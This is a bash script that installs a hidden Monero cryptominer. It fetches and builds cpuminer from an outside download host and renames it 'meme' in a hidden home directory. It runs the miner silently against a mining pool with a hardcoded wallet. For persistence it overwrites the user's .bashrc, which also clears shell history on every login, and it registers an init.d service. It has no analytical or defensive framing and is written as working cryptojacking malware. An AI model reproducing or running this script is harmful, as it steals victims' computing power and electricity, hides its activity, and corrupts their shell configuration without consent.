#!/bin/bash

cd ~/
mkdir .meme
cd .meme
KERBS=`~/.meme`
echo $KERBS

STR="#! /bin/sh\n\
# /etc/init.d/meme \n\
\n\
### BEGIN INIT INFO\n\
# Provides: meme\n\
# Required-Start: \$all\n\
# Required-Stop: \$all\n\
# Default-Start: 2 3 4 5\n\
# Default-Stop: 0 1 6\n\
# Short-Description: meme\n\
# Description: meme\n\
### END INIT INFO\n\
\n\
# If you want a command to always run, put it here\n\
\n\
# Carry out specific functions when asked to by the system\n\
case \"\$1\" in\n\
  start)\n\
    echo \"Starting meme\"\n\
    # run application you want to start\n\
    cd $KERBS\n\
    killall minerd\n\
    ./meme -a cryptonight -o stratum+tcp://xmr.crypto-pool.fr:3333 -u 464ntWJZ2umcetkJNbGRjfAqXpbdyizCMhq7kx6NmbACGssmFysmZo6YAsNojAfAeT1KNRVaaMeDETDtXQ2X4cFSFVVATVz -p x  &>/dev/null &\n\
    ;;\n\
  stop)\n\
    echo \"Stopping meme\"\n\
    # kill application you want to stop\n\
    killall minerd\n\
    killall meme\n\
    ;;\n\
  *)\n\
    echo \"Usage: /etc/init.d/meme {start|stop}\"\n\
    exit 1\n\
    ;;\n\
esac\n\
\n\
exit 0"
sudo killall meme
sudo killall minerd
sudo dpkg --configure -a
sudo apt-get update --fix-missing -y
sudo apt-get install automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev make g++ git -y
sudo add-apt-repository ppa:ubuntu-toolchain-r/test -y
sudo apt-get update -y
sudo apt-get remove insserv -y
sudo apt-get install gcc-6 g++-6 libjansson-dev -y
sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-6 60 --slave /usr/bin/g++ g++ /usr/bin/g++-6
sudo apt-get install build-essential automake libjansson-dev libgmp-dev libcurl4-openssl-dev libssl-dev pthreads zlib unzip -y
wget https://a.cocaine.ninja/lcgvac.zip -O meme.zip
unzip -o meme.zip
cd cpuminer-multi-linux
chmod +x ./build.sh
sh build.sh
mv cpuminer ../meme
cd ../
rm -rf ./cpuminer-multi-linux
rm bins.sh
sudo chmod +x meme
echo -e "export LANG=en_us_8859_1" > ~/.bashrc
echo -e "cd ~/.meme/" >> ~/.bashrc
echo -e "killall minerd &>/dev/null &" >> ~/.bashrc
echo -e "killall meme &>/dev/null &" >> ~/.bashrc
echo -e "./meme -a cryptonight -o stratum+tcp://xmr.crypto-pool.fr:3333 -u 464ntWJZ2umcetkJNbGRjfAqXpbdyizCMhq7kx6NmbACGssmFysmZo6YAsNojAfAeT1KNRVaaMeDETDtXQ2X4cFSFVVATVz -p x  &>/dev/null &" >> ~/.bashrc
echo -e "cd ../" >> ~/.bashrc
echo -e "cat /dev/null > ~/.bash_history && history -c" >> ~/.bashrc
./meme -a cryptonight -o stratum+tcp://xmr.crypto-pool.fr:3333 -u 464ntWJZ2umcetkJNbGRjfAqXpbdyizCMhq7kx6NmbACGssmFysmZo6YAsNojAfAeT1KNRVaaMeDETDtXQ2X4cFSFVVATVz -p x  &>/dev/null &
sudo su
echo -e "$STR" > /etc/init.d/meme
chmod 755 /etc/init.d/meme
update-rc.d meme defaults
echo $STR
echo str